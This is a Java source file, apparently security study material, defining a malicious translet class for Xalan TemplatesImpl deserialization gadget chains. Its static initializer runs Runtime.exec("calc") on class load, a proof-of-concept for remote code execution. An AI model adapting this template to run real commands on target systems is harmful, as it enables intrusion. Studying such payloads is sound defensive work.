package com.mechoy;

import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;

import java.io.IOException;

/**
 * Author  Mechoy
 * Version 1.0
 * Date    2023/3/29
 */
public class XXX extends com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet{
    static {
        try {
            Runtime.getRuntime().exec("calc");
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    {
        System.out.println("代码块执行...");
    }
    public String name;

    public XXX(String name) {
        this.name = name;
    }

    @Override
    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {

    }

    @Override
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {

    }
}
